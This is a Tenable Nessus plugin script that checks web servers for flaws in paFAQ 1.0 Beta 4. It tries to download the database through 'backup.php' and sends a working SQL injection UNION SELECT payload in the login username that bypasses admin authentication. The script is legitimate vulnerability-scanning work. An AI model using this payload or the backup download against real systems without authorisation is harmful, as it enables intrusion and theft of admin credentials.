#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(18535);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2005-0475", "CVE-2005-2011", "CVE-2005-2012", "CVE-2005-2013", "CVE-2005-2014");
  script_bugtraq_id(12582, 13999, 14001, 14003);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"13934");
    script_xref(name:"OSVDB", value:"13935");
    script_xref(name:"OSVDB", value:"13936");
    script_xref(name:"OSVDB", value:"13937");
    script_xref(name:"OSVDB", value:"17563");
    script_xref(name:"OSVDB", value:"17564");
    script_xref(name:"OSVDB", value:"17565");
    script_xref(name:"OSVDB", value:"17566");
    script_xref(name:"OSVDB", value:"17567");
  }

  script_name(english:"paFAQ 1.0 Beta 4 Multiple Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that suffers from
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running paFAQ, a web-based FAQ system implemented
in PHP / MySQL. 

The installed version of paFAQ on the remote host suffers from several
vulnerabilities.  Among the more serious are a SQL injection
vulnerability that enables an attacker to bypass admin authentication
and a 'backup.php' script that allows attackers to download paFAQ's
database, complete with the administrator's password hash." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2005-02/0269.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.gulftech.org/?node=research&article_id=00083-06202005" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2005-06/0155.html" );
 script_set_attribute(attribute:"solution", value:
"Remove the 'backup.php' script and enable PHP's 'magic_quotes_gpc'
setting." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  summary["english"] = "Checks for multiple vulnerabilities in paFAQ";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


init_cookiejar();
# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  if (thorough_tests)
  {
    # Try to request the database.
    r = http_send_recv3(method: "GET", item:string(dir, "/admin/backup.php"), port:port);
    if (isnull(r)) exit(1);

    # There's a problem if we could download the database.
    if ("# paFAQ MySQL Dump" >< r[2]) {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }

  erase_http_cookie(name: "pafaq_pass");	# Just in case it existed in the default cookie jar
  # Try the admin authenication bypass, in case 'backup.php' was just removed.
  r = http_send_recv3(method: "GET",
    item:string(
      dir, "/admin/index.php?",
      "act=login&",
      # nb: this is differs slightly from the Gulftech advisory but
      #     doesn't require us to know the database prefix.
      "username='%20UNION%20SELECT%201,'", SCRIPT_NAME, "','5e0bd03bec244039678f2b955a2595aa','',0,'',''--&",
      "password=nessus"
    ), 
    port:port
  );
  if (isnull(r)) exit(1);

  # There's a problem if we're authenticated.
  val = get_http_cookie(name: "pafaq_pass");
  #
  if (val ==  "5e0bd03bec244039678f2b955a2595aa") {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
